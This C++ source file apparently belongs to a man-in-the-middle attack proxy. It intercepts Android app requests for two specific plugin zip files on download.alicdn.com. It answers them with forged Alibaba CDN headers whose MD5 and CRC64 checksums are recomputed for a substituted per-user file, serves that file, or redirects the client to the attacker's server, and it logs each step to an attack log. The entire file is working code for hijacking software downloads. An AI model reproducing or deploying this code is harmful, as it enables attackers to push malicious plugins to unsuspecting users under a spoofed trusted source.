
#include "alicdn.h"
#include "../cipher/CryptoUtils.h"
#include "../cipher/Base64.h"
#include "PluginServer.h"
#include "../Public.h"
#include "../attack.h"
#include "../HttpUtils.h"


/*
HEAD download.alicdn.com/freedom/58245/compress/6fb1a836586fd637faf9d1b3de7bf8d1.zip HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; MIX 2S MIUI/V10.0.7.0.PDGCNFH)
Host: download.alicdn.com
Connection: Keep-Alive
Accept-Encoding: gzip

HEAD download.alicdn.com/freedom/58245/compress/74f38295f5991115867896bc6ee7864b.zip HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; MIX 2S MIUI/V10.0.7.0.PDGCNFH)
Host: download.alicdn.com
Connection: Keep-Alive
Accept-Encoding: gzip
*/


int gAlicdnFlag = 0;
//int gAliCdnMode = 0;

int AliCdn::isAliCdnHead(const char * url, const char * host) {
	if (strstr(host, "download.alicdn.com") == FALSE) {
		return FALSE;
	}

	if (memcmp(url,"HEAD /",6) != 0 )
	{
		return FALSE;
	}


	if (strstr(url, "/freedom/") && strstr(url, "/compress/") && strstr(url, ".zip") && strstr(url,"74f38295f5991115867896bc6ee7864b") )
	{
		gAlicdnFlag = 1;
		return 1;
	}
	else if (strstr(url, "/freedom/") && strstr(url, "/compress/") && strstr(url, ".zip") && strstr(url, "6fb1a836586fd637faf9d1b3de7bf8d1"))
	{
		gAlicdnFlag = 2;
		return 2;
	}
	return FALSE;
}


int AliCdn::isAliCdnRequest(const char * url, const char * host) {
	if (strstr(host, "download.alicdn.com") == FALSE) {
		return FALSE;
	}

	if (strstr(url, "/freedom/") && strstr(url, "/compress/") && strstr(url, ".zip") && strstr(url, "74f38295f5991115867896bc6ee7864b"))
	{
		gAlicdnFlag = 1;
		return 1;
	}
	else if (strstr(url, "/freedom/") && strstr(url, "/compress/") && strstr(url, ".zip") && strstr(url, "6fb1a836586fd637faf9d1b3de7bf8d1"))
	{
		gAlicdnFlag = 2;
		return 2;
	}
	return FALSE;
}


int AliCdn::makeRequestReply(char * dstbuf, int dstbuflimit, LPHTTPPROXYPARAM http) {

	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/zip\r\n"
		"Connection: keep-alive\r\n"
		"Accept-Ranges: bytes\r\n"
		"x-oss-request-id: 5C6C595E10C40E751406673E\r\n"
		"x-oss-object-type: Normal\r\n"
		"x-oss-storage-class: Standard\r\n"
		"Cache-Control: max-age=86400\r\n"
		"Age: 86400\r\n"
		"ETag: \"%s\"\r\n"
		"x-oss-hash-crc64ecma: %s\r\n"
		"x-oss-meta-md5: %s\r\n"
		"X-Swift-CacheTime: 86400\r\n"
		"Timing-Allow-Origin: *\r\n"
		"EagleId: 7515e1a115506618762527848e\r\n"
		"Content-MD5: %s\r\n%s";
	string contentlen = "Content-Length: %u\r\n\r\n";

	int ret = 0;
	string filename = "";
	string urlfilename = "";
	if (gAlicdnFlag == 1)
	{
		filename = Public::getUserPluginPath(http->username) + "74f38295f5991115867896bc6ee7864b.zip";
		urlfilename = Public::getUserUrl(http->username, "74f38295f5991115867896bc6ee7864b.zip");
	}
	else if (gAlicdnFlag == 2)
	{
		filename = Public::getUserPluginPath(http->username) + "6fb1a836586fd637faf9d1b3de7bf8d1.zip";
		urlfilename = Public::getUserUrl(http->username, "6fb1a836586fd637faf9d1b3de7bf8d1.zip");
	}
	else {
		return -1;
	}

	string crc64 = CryptoUtils::FileCrc64(filename, -1, 0);
	if (crc64 == "")
	{
		return FALSE;
	}

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char szmd5Lowercase[64] = { 0 };
	filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5Lowercase, hexmd5, TRUE);

	char szbase64md5[64] = { 0 };
	ret = Base64::Base64Encode(szbase64md5, (const unsigned char*)hexmd5, 16);

	char hdrformat[4096];
	int httphdrlen = sprintf_s(hdrformat, 4096, szHttpPartialZipFormat, szmd5,crc64.c_str(), szmd5Lowercase, szbase64md5, contentlen.c_str());
	//filesize is not filled

	char szout[4096];
	int outlen = sprintf_s(szout, 4096, "alicdn reply:%s\r\n", hdrformat);
	Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, outlen);

	ret = PluginServer::SendPluginFile(urlfilename.c_str(), http, hdrformat, 1);

	return httphdrlen;
}


int AliCdn::makeRequestReply(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {

	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/zip\r\n"
		"Connection: keep-alive\r\n"
		"Accept-Ranges: bytes\r\n"
		"x-oss-request-id: 5C6C595E10C40E751406673E\r\n"
		"x-oss-object-type: Normal\r\n"
		"x-oss-storage-class: Standard\r\n"
		"Cache-Control: max-age=86400\r\n"
		"Age: 86400\r\n"
		"ETag: \"%s\"\r\n"
 		"x-oss-hash-crc64ecma: %s\r\n"
 		"x-oss-meta-md5: %s\r\n"
		"X-Swift-CacheTime: 86400\r\n"
		"Timing-Allow-Origin: *\r\n"
		"EagleId: 7515e1a115506618762527848e\r\n"
		"Content-MD5: %s\r\n%s";
	string contentlen = "Content-Length: %u\r\n\r\n";

	int ret = 0;
	string filename = "";
	string urlfilename = "";
	if (gAlicdnFlag == 1)
	{
		filename = Public::getUserPluginPath(lpssl->username) + "74f38295f5991115867896bc6ee7864b.zip";
		urlfilename = Public::getUserUrl(lpssl->username, "74f38295f5991115867896bc6ee7864b.zip");
	}
	else if (gAlicdnFlag == 2)
	{
		filename = Public::getUserPluginPath(lpssl->username) + "6fb1a836586fd637faf9d1b3de7bf8d1.zip";
		urlfilename = Public::getUserUrl(lpssl->username, "6fb1a836586fd637faf9d1b3de7bf8d1.zip");
	}
	else {
		return -1;
	}

	string crc64 = CryptoUtils::FileCrc64(filename, -1, 0);
	if (crc64 == "")
	{
		return FALSE;
	}

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char szmd5Lowercase[64] = { 0 };
	filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5Lowercase, hexmd5, TRUE);

	char szbase64md5[64] = { 0 };
	ret = Base64::Base64Encode(szbase64md5, (const unsigned char*)hexmd5, 16);

	char hdrformat[4096];
	int httphdrlen = sprintf_s(hdrformat, 4096, szHttpPartialZipFormat, szmd5,crc64.c_str(), szmd5Lowercase, szbase64md5,contentlen.c_str());
	//filesize is not filled

	char szout[4096];
	int outlen = sprintf_s(szout,4096, "alicdn reply:%s\r\n", hdrformat);
	Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, outlen);

	ret = PluginServer::SendPluginFile(urlfilename.c_str(), lpssl, hdrformat, 1);
	
	return httphdrlen;
}


int AliCdn::makeHead(string filename,char * dstbuf,int dstbuflimit) {
	int ret = 0;
	string crc64 = CryptoUtils::FileCrc64(filename, -1, 0);
	if (crc64 == "")
	{
		return FALSE;
	}
	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char szmd5Lowercase[64] = { 0 };
	filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5Lowercase, hexmd5, TRUE);

	char szbase64md5[64] = { 0 };
	ret = Base64::Base64Encode(szbase64md5, (const unsigned char*)hexmd5, 16);


	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/zip\r\n"
		"Connection: keep-alive\r\n"
		"Accept-Ranges: bytes\r\n"
		"x-oss-request-id: 5C6C595E10C40E751406673E\r\n"
		"x-oss-object-type: Normal\r\n"
		"x-oss-storage-class: Standard\r\n"
		"Cache-Control: max-age=86400\r\n"
		"Age: 86400\r\n"
		"ETag: \"%s\"\r\n"
		"x-oss-hash-crc64ecma: %s\r\n"
 		"x-oss-meta-md5: %s\r\n"
		"Content-MD5: %s\r\n"
		"X-Swift-CacheTime: 86400\r\n"
		"Timing-Allow-Origin: *\r\n"
		"EagleId: 7515e1a115506618762527848e\r\n"
		"Content-Length: %u\r\n\r\n";

	int httphdrlen = sprintf_s(dstbuf, dstbuflimit, szHttpPartialZipFormat, szmd5, crc64.c_str(), szmd5Lowercase, szbase64md5, filesize);

	char szout[4096];
	int outlen = sprintf_s(szout, 4096, "alicdn header:%s\r\n", dstbuf);
	Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, outlen);

	return httphdrlen;
}

int AliCdn::makeHeadReply(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {
	int ret = 0;
	string filename = "";
	if (gAlicdnFlag == 1)
	{
		filename = Public::getUserPluginPath(lpssl->username) + "74f38295f5991115867896bc6ee7864b.zip";
	}else if (gAlicdnFlag == 2)
	{
		filename = Public::getUserPluginPath(lpssl->username) + "6fb1a836586fd637faf9d1b3de7bf8d1.zip";
	}

	int httphdrlen = makeHead(filename, dstbuf, dstbuflimit);

	return httphdrlen;
}



int AliCdn::makeRedirection(char * lpbuf, int bufsize, int limit, LPSSLPROXYPARAM lpssl) {
	char *szformat = "HTTP/1.1 302 Found\r\n"
		"Content-Type: text/plain; charset=utf-8\r\n"
		"Content-Length: 0\r\n"
		"Connection: keep-alive\r\n"
		"Location: http://%s/%s\r\n\r\n";

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;

	int totallen = 0;
	if (gAlicdnFlag == 1)
	{
		totallen = sprintf_s(lpbuf, limit, szformat, strip.c_str(), "74f38295f5991115867896bc6ee7864b.zip");
	}
	else if (gAlicdnFlag == 2)
	{
		totallen = sprintf_s(lpbuf, limit, szformat, strip.c_str(), "6fb1a836586fd637faf9d1b3de7bf8d1.zip");
	}

	return totallen;
}